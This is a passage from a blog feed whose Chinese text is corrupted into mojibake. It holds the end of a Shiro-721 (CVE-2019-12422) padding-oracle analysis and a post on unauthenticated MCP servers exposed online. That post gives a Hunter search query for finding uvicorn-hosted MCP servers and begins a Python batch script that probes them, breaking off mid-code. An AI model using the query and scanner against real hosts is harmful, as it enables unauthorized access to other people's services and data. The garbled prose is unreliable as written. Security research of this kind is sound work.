src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.35.28@2x.png" alt="CleanShot 2025-08-15 at 14.35.28@2x"></p><p>å€˜è‹¥Paddingç»“æœä¸æ­£ç¡®çš„è¯ï¼Œå“åº”åŒ…å°±ä¼šè¿”å› <code>Set-Cookie: rememberMe=deleteMe</code> ã€‚</p><h4 id="0x02-Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯å¤„ç†"><a href="#0x02-Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯å¤„ç†" class="headerlink" title="0x02 Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯å¤„ç†"></a>0x02 Paddingæ­£ç¡®ï¼Œååºåˆ—åŒ–é”™è¯¯å¤„ç†</h4><p>Shiroä¸­å…³äºååºåˆ—åŒ–çš„å¤„ç†åœ¨ <code>org.apache.shiro.io.DefaultSerializer#deserialize()</code> æ–¹æ³•ä¸‹</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.50.12@2x.png" alt="CleanShot 2025-08-15 at 14.50.12@2x"></p><p>å¦‚æœååºåˆ—åŒ–çš„ç»“æœé”™è¯¯ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æœ€åå¼‚å¸¸ä»ä¼šè¢«<code>getRememberedPrincipals()</code>æ–¹æ³•å¤„ç†ã€‚</p><p>ä½†æ˜¯å¯¹äºJavaæ¥è¯´ï¼Œååºåˆ—åŒ–æ˜¯ä»¥Streamçš„æ–¹å¼æŒ‰é¡ºåºè¿›è¡Œçš„ï¼Œå‘å…¶åæ·»åŠ æˆ–æ›´æ”¹ä¸€äº›å­—ç¬¦ä¸²å¹¶ä¸ä¼šå½±å“æ­£å¸¸ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶å»æ„é€ ä¸€äº›æ¶æ„å‘½ä»¤æ˜¯å…è®¸çš„ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆå½¢æˆæ¼æ´çš„åŸå› </p><p>äºæ˜¯è¿™é‡Œå°±æ„é€ å‡ºäº†å¸ƒå°”æ¡ä»¶</p><ul><li>Padding æ­£ç¡®ï¼ŒæœåŠ¡å™¨æ­£å¸¸å“åº”</li><li>Padding é”™è¯¯ï¼ŒæœåŠ¡å™¨è¿”å› <code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>721ä¸»è¦çš„è§£å¯†è¿‡ç¨‹æ²¡æœ‰å˜ï¼Œåªè¦ä½ æˆåŠŸpaddingè¿›å»äº†ï¼Œå°±èƒ½èµ°åˆ°ååºåˆ—åŒ–é‚£ä¸€æ­¥ï¼Œä¸ªäººæ„Ÿè§‰ä¸ç”¨ç†è§£é‚£ä¹ˆé€å½»ï¼Œæœ¬èº«è¿™ä¸ªæ¼æ´ä¹ŸæŒºé¸¡è‚‹ï¼Œéœ€è¦ç™»é™†æˆåŠŸçš„èº«ä»½è®¤è¯cookieæ‰èƒ½æ”»å‡»ã€‚</p><p>æ ¹æ®éªŒè¯æˆåŠŸçš„cookieæ¥Paddingï¼Œå¹¶åœ¨åæ–¹æ„é€ ä¸ä¼šå½±å“åŸæœ¬çš„åºåˆ—åŒ–ï¼Œå½¢æˆæ¼æ´</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">Javaååºåˆ—åŒ–Shiroç¯‡02-Shiro721æµç¨‹åˆ†æ</a></p><p><a href="https://goodapple.top/archives/261">Javaååºåˆ—åŒ–æ¼æ´â€”â€”Shiro721</a></p><p><a href="https://www.cnblogs.com/dhan/p/18423531">Shiro-721â€”æ¼æ´åˆ†æ(CVE-2019-12422)</a></p>]]></content>
    
    
    <categories>
      
      <category>ååºåˆ—åŒ–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>éƒ¨ç½²åœ¨å…¬ç½‘çš„mcpå¯èƒ½å­˜åœ¨çš„ä¸€ä¸ªæœªæˆæƒé—®é¢˜</title>
    <link href="/2025/08/24/%E9%83%A8%E7%BD%B2%E5%9C%A8%E5%85%AC%E7%BD%91%E7%9A%84mcp%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <url>/2025/08/24/%E9%83%A8%E7%BD%B2%E5%9C%A8%E5%85%AC%E7%BD%91%E7%9A%84mcp%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h1><p><strong>æœ‰æ•ˆæœŸæˆªæ­¢åˆ°2025å¹´08æœˆ24æ—¥ä¾ç„¶æœ‰æ•ˆï¼Œç›®å‰è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ç”¨æ¥æŒ–æ¼æ´çš„çŠ¶æ€</strong></p><p>MCPï¼ˆModel Context Protocolï¼‰æ˜¯ç”±Anthropicäº2024å¹´11æœˆæ¨å‡ºçš„ä¸€ç§å¼€æ”¾æ ‡å‡†ï¼Œæ—¨åœ¨è§£å†³å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ä¸å¤–éƒ¨æ•°æ®æºå’Œå·¥å…·ä¹‹é—´çš„é€šä¿¡é—®é¢˜ã€‚å…¶ä¸»è¦ç›®æ ‡æ˜¯æ‰“ç ´å½“å‰AIæ¨¡å‹çš„æ•°æ®å­¤å²›é™åˆ¶ï¼Œä»è€Œä½¿AIåº”ç”¨èƒ½å¤Ÿæ›´åŠ é«˜æ•ˆåœ°è®¿é—®å’Œæ“ä½œæœ¬åœ°åŠå¤–éƒ¨çš„æ•°æ®æºã€‚</p><p>MCPçš„æ ¸å¿ƒç›®æ ‡åŒ…æ‹¬ï¼š</p><ol><li><strong>å¢å¼ºæ•°æ®äº’é€šæ€§</strong>ï¼šä½¿å¾—ä¸åŒçš„AIæ¨¡å‹èƒ½å¤Ÿåœ¨ä¸ä¾èµ–å•ä¸€ç³»ç»Ÿçš„æƒ…å†µä¸‹ï¼Œçµæ´»åœ°ä¸å¤–éƒ¨èµ„æºè¿›è¡Œäº¤äº’ã€‚</li><li><strong>æ¶ˆé™¤ç¯å¢ƒä¾èµ–</strong>ï¼šæä¾›ä¸€ä¸ªç»Ÿä¸€çš„é€šä¿¡åè®®ï¼Œç®€åŒ–æ¨¡å‹ä¸å¤–éƒ¨å·¥å…·çš„é›†æˆï¼Œä½¿å¾—æ¨¡å‹åœ¨ä¸åŒçš„ç¯å¢ƒä¸­èƒ½æ— ç¼è¿è¡Œã€‚</li><li><strong>æé«˜æ•ˆç‡</strong>ï¼šå‡å°‘ä¼ ç»Ÿçš„è°ƒç”¨å’Œæ•°æ®ä¼ è¾“æ–¹å¼ä¸­çš„å»¶è¿Ÿï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æ•´ä½“å“åº”é€Ÿåº¦å’Œå‡†ç¡®æ€§ã€‚</li></ol><p>å¯ä»¥æŠŠå®ƒç†è§£ä¸ºä¸€ä¸ªâ€ä¸­ä»‹åè®®â€ï¼Œä½¿å¾—AIæ¨¡å‹èƒ½å¤Ÿåœ¨ä¸åŒçš„æ•°æ®å¹³å°å’Œå·¥å…·ä¹‹é—´é¡ºåˆ©é€šä¿¡ï¼Œå®ç°æ›´å¤æ‚çš„ä»»åŠ¡å’ŒåŠŸèƒ½ã€‚</p><p>MCPå·²ç»å‡ºæ¥å¾ˆé•¿ä¸€æ®µæ—¶é—´äº†ï¼Œå¸‚é¢ä¸Šå‡ºç°çš„å¤§é‡å¼€æºMCPæœåŠ¡æ˜¯æ²¡æœ‰é‰´æƒçš„ï¼Œå³å¯ä»¥ç›´æ¥ä½¿ç”¨uvicornéƒ¨ç½²åˆ°å…¬ç½‘ï¼Œé‚£ä¹ˆè¿™å°±å¯¼è‡´ä¸€ä¸ªå¤§é—®é¢˜ï¼Œä¹Ÿæ˜¯ä¼ ç»Ÿwebæ¸—é€ä¸­ç‰¹åˆ«å¸¸è§çš„é—®é¢˜â€”â€”æœªæˆæƒè®¿é—®ï¼Œæ”»å‡»è€…å¯ä»¥ä¸ç»è¿‡æˆæƒç›´æ¥å»è°ƒç”¨è¿™äº›MCPï¼Œæ“ä½œæœ¬åœ°åŠè¿œç¨‹æ•°æ®æœ¬èº«å°±å­˜åœ¨é«˜å±é£é™©ï¼Œä¹Ÿæ˜¯ä¼šå‡ºç°æ¼æ´çš„åœ°æ–¹ã€‚</p><h1 id="MCPæ”¯æŒçš„é€šä¿¡æ¨¡å¼"><a href="#MCPæ”¯æŒçš„é€šä¿¡æ¨¡å¼" class="headerlink" title="MCPæ”¯æŒçš„é€šä¿¡æ¨¡å¼"></a>MCPæ”¯æŒçš„é€šä¿¡æ¨¡å¼</h1><p>MCPï¼ˆæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰ä¸»è¦æ”¯æŒä»¥ä¸‹ä¸‰ç§é€šä¿¡æ¨¡å¼ï¼š</p><h2 id="1-STDIOæ¨¡å¼ï¼ˆæ ‡å‡†è¾“å…¥è¾“å‡ºï¼‰"><a href="#1-STDIOæ¨¡å¼ï¼ˆæ ‡å‡†è¾“å…¥è¾“å‡ºï¼‰" class="headerlink" title="1. STDIOæ¨¡å¼ï¼ˆæ ‡å‡†è¾“å…¥è¾“å‡ºï¼‰"></a>1. STDIOæ¨¡å¼ï¼ˆæ ‡å‡†è¾“å…¥è¾“å‡ºï¼‰</h2><p>STDIOæ˜¯MCPæœ€å¸¸è§ã€äº’æ“ä½œæ€§æœ€å¥½çš„é€šä¿¡æ¨¡å¼ï¼Œä¹Ÿæ˜¯å®˜æ–¹æ¨èçš„æ–¹å¼ã€‚å®ƒä½¿ç”¨æ ‡å‡†è¾“å…¥&#x2F;è¾“å‡ºæµè¿›è¡Œé€šä¿¡ï¼Œç‰¹åˆ«é€‚ç”¨äºæœ¬åœ°è¿›ç¨‹ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>é€šè¿‡æ ‡å‡†è¾“å…¥è¾“å‡ºæµä¼ é€’æ•°æ®</li><li>ç®€å•æ˜“äºå®ç°</li><li>é€‚åˆæœ¬åœ°è¿›ç¨‹é—´é€šä¿¡</li><li>æ— éœ€ç½‘ç»œé…ç½®</li><li>è‡ªç„¶çš„è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸç®¡ç†</li><li>ä½¿ç”¨ä¸€ç§ç®€å•çš„æ¶ˆæ¯å¸§æ ¼å¼ï¼ŒåŒ…æ‹¬<code>Content-Length</code>å¤´å’ŒJSON-RPCæ¶ˆæ¯</li></ul><p><strong>å±€é™æ€§ï¼š</strong></p><ul><li>åªé€‚ç”¨äºæœ¬åœ°è¿›ç¨‹</li><li>æ¯ä¸ªæœåŠ¡å™¨ä»…é™ä¸€ä¸ªå®¢æˆ·ç«¯</li><li>æ²¡æœ‰å†…ç½®è®¤è¯æœºåˆ¶</li><li>å¯èƒ½å­˜åœ¨é˜»å¡é—®é¢˜</li></ul><h2 id="2-SSEæ¨¡å¼ï¼ˆæœåŠ¡å™¨å‘é€äº‹ä»¶ï¼‰"><a href="#2-SSEæ¨¡å¼ï¼ˆæœåŠ¡å™¨å‘é€äº‹ä»¶ï¼‰" class="headerlink" title="2. SSEæ¨¡å¼ï¼ˆæœåŠ¡å™¨å‘é€äº‹ä»¶ï¼‰"></a>2. SSEæ¨¡å¼ï¼ˆæœåŠ¡å™¨å‘é€äº‹ä»¶ï¼‰</h2><p>SSEä½¿ç”¨HTTPè¿›è¡Œå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è¯·æ±‚ï¼Œä½¿ç”¨SSEï¼ˆServer-Sent Eventsï¼‰è¿›è¡ŒæœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ¶ˆæ¯ä¼ é€’ã€‚è¿™ç§æ–¹å¼é€‚åˆWebåº”ç”¨ç¨‹åºå’Œè¿œç¨‹æœåŠ¡å™¨ã€‚æ ¹æ®æœ€æ–°ä¿¡æ¯ï¼ŒSSEç°åœ¨è¢«è§†ä¸ºå·²å¼ƒç”¨ï¼Œä½†ä»ç„¶è¢«è®¸å¤šå·¥å…·æ”¯æŒã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>å®¢æˆ·ç«¯é€šè¿‡HTTP POSTè¯·æ±‚å‘é€æ¶ˆæ¯</li><li>æœåŠ¡å™¨é€šè¿‡SSEäº‹ä»¶å‘é€æ¶ˆæ¯å›å®¢æˆ·ç«¯</li><li>å¯ä»¥é€šè¿‡æ ‡å‡†HTTPå·¥ä½œ</li><li>æ”¯æŒè¿œç¨‹å®¢æˆ·ç«¯</li><li>å¯ä»¥æœåŠ¡å¤šä¸ªå®¢æˆ·ç«¯</li><li>ä¸WebåŸºç¡€è®¾æ–½é›†æˆ</li></ul><p><strong>å±€é™æ€§ï¼š</strong></p><ul><li>å®ç°è¾ƒä¸ºå¤æ‚</li><li>éœ€è¦HTTPæœåŠ¡å™¨</li><li>è¿æ¥ç®¡ç†æ›´å…·æŒ‘æˆ˜æ€§</li><li>å¯èƒ½å­˜åœ¨é˜²ç«å¢™é—®é¢˜</li></ul><h2 id="3-Streaming-HTTPæ¨¡å¼"><a href="#3-Streaming-HTTPæ¨¡å¼" class="headerlink" title="3. Streaming HTTPæ¨¡å¼"></a>3. Streaming HTTPæ¨¡å¼</h2><p>è¿™æ˜¯åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„MCPè§„èŒƒä¸­æ·»åŠ çš„æ¨¡å¼ï¼Œç”¨äºæ›¿ä»£SSEæ¨¡å¼ã€‚Streaming HTTPæœåŠ¡å™¨å¯ä»¥â€åŸæ ·â€éƒ¨ç½²ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>ä½¿ç”¨HTTPé•¿è¿æ¥è¿›è¡ŒåŒå‘é€šä¿¡</li><li>æ›´é€‚åˆç°ä»£Webåº”ç”¨</li><li>å¯èƒ½æœ‰æ›´å¥½çš„å…¼å®¹æ€§å’Œæ€§èƒ½</li><li>ä¸ç°ä»£Webæ ‡å‡†æ›´åŠ ä¸€è‡´</li></ul><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>MCPæ”¯æŒä¸‰ç§ä¸»è¦çš„é€šä¿¡æ¨¡å¼ï¼šSTDIOï¼ˆæ ‡å‡†è¾“å…¥&#x2F;è¾“å‡ºï¼‰ã€SSEï¼ˆæœåŠ¡å™¨å‘é€äº‹ä»¶ï¼‰å’ŒStreaming HTTPã€‚å½“å‰çš„mcp_client.pyè„šæœ¬ä¸“æ³¨äºæ£€æµ‹SSEæ¨¡å¼çš„æœåŠ¡å™¨ï¼Œä½†å¯ä»¥æ‰©å±•ä»¥æ”¯æŒå…¶ä»–é€šä¿¡æ¨¡å¼ã€‚STDIOæ˜¯å®˜æ–¹æ¨èçš„æ¨¡å¼ï¼Œå…·æœ‰æœ€å¥½çš„äº’æ“ä½œæ€§ï¼Œè€ŒSSEç°åœ¨è¢«è§†ä¸ºå·²å¼ƒç”¨ä½†ä»ç„¶å—åˆ°æ”¯æŒã€‚</p><h1 id="å…¬ç½‘éƒ¨ç½²MCPæœåŠ¡å­˜åœ¨çš„æœªæˆæƒ"><a href="#å…¬ç½‘éƒ¨ç½²MCPæœåŠ¡å­˜åœ¨çš„æœªæˆæƒ" class="headerlink" title="å…¬ç½‘éƒ¨ç½²MCPæœåŠ¡å­˜åœ¨çš„æœªæˆæƒ"></a>å…¬ç½‘éƒ¨ç½²MCPæœåŠ¡å­˜åœ¨çš„æœªæˆæƒ</h1><p>ä»¥å¸¸è§çš„æœºå™¨å­¦ä¹ æ¨¡å‹æœåŠ¡é€šå¸¸æ¶‰åŠåˆ°å°†é¢„è®­ç»ƒçš„æ¨¡å‹ï¼ˆå¦‚ TensorFlowã€PyTorch æ¨¡å‹ï¼‰é€šè¿‡ API æä¾›æœåŠ¡ä¸ºä¾‹ï¼Œéƒ¨ç½²ä»£ç ä¸º</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;mcpServers&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ml_model&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;uv&quot;</span>,<br>      <span class="hljs-string">&quot;args&quot;</span>: [<br>        <span class="hljs-string">&quot;--directory&quot;</span>,<br>        <span class="hljs-string">&quot;path/to/ml_model_server&quot;</span>,<br>        <span class="hljs-string">&quot;run&quot;</span>,<br>        <span class="hljs-string">&quot;ml_model_server&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;env&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;MODEL_PATH&quot;</span>: <span class="hljs-string">&quot;/path/to/your/model&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>äº¦æˆ–è€…æ˜¯å¸¸è§çš„æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡æœ‰ <strong>RabbitMQ</strong> å’Œ <strong>Kafka</strong>çš„éƒ¨ç½²ï¼Œéƒ¨ç½²ä»£ç ä¸º</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;mcpServers&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;rabbitmq&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;uv&quot;</span>,<br>      <span class="hljs-string">&quot;args&quot;</span>: [<br>        <span class="hljs-string">&quot;--directory&quot;</span>,<br>        <span class="hljs-string">&quot;path/to/rabbitmq_mcp_server&quot;</span>,<br>        <span class="hljs-string">&quot;run&quot;</span>,<br>        <span class="hljs-string">&quot;rabbitmq_mcp_server&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;env&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;RABBITMQ_HOST&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_PORT&quot;</span>: <span class="hljs-string">&quot;5672&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_USER&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_PASSWORD&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·å°†è‡ªå·±çš„ç›¸å…³ä¿¡æ¯<strong>RABBITMQ_HOST</strong>ã€<strong>RABBITMQ_PORT</strong>ã€<strong>RABBITMQ_USER</strong>ã€<strong>RABBITMQ_PASSWORD</strong>å¡«å…¥åéƒ¨ç½²ï¼Œå¹¶ä¸”å°†å…¶æ”¾åˆ°å…¬ç½‘ä¸Šï¼Œé‚£ä¹ˆå³å¯è¢«æ”»å‡»è€…è·å–åˆ°</p><p>hunteræŸ¥è¯¢uvicornéƒ¨ç½²mcpè¯­æ³•ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">header</span>.<span class="hljs-keyword">server</span>==&quot;uvicorn&quot;&amp;&amp;<span class="hljs-keyword">header</span>.status_code==&quot;404&quot;&amp;&amp;<span class="hljs-keyword">header</span>=&quot;text/plain&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2001.44.22@2x.png"></p><p>å¦‚æœè¦ä½¿ç”¨SSEæ¨¡å¼çš„mcpï¼Œç›´æ¥é€ä¸ªè®¿é—®è®¿é—®&#x2F;sse åˆ¤æ–­æ˜¯å¦å­˜åœ¨sseæ¨¡å¼çš„MCPï¼Œå…¶ä»–æ¨¡å¼ç±»ä¼¼ï¼Œç»™å‡ºæˆ‘æ‰€ä½¿ç”¨çš„æ‰¹é‡å¤„ç†çš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> AsyncExitStack<br><br><span class="hljs-comment"># é¿å…ä¸å·²å®‰è£…çš„mcpåŒ…å†²çªï¼Œä½¿ç”¨å®Œæ•´å¯¼å…¥è·¯å¾„</span><br><span class="hljs-keyword">import</span> mcp<br><span class="hljs-keyword">from</span> mcp <span class="hljs-keyword">import</span> ClientSession, StdioServerParameters<br><span class="hljs-keyword">from</span> mcp.client.sse <span class="hljs-keyword">import</span> sse_client<br><br><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv<br><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> AsyncOpenAI, OpenAI<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># ä»CSVæ–‡ä»¶ä¸­æå–URL</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_urls_from_csv</span>(<span class="hljs-params">csv_file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä»CSVæ–‡ä»¶ä¸­æå–URLåˆ—çš„æ•°æ®</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    å‚æ•°:</span><br><span class="hljs-string">        csv_file_path: CSVæ–‡ä»¶è·¯å¾„</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    è¿”å›:</span><br><span class="hljs-string">        åŒ…å«æ‰€æœ‰æœ‰æ•ˆURLçš„åˆ—è¡¨</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    urls = []<br>    <span 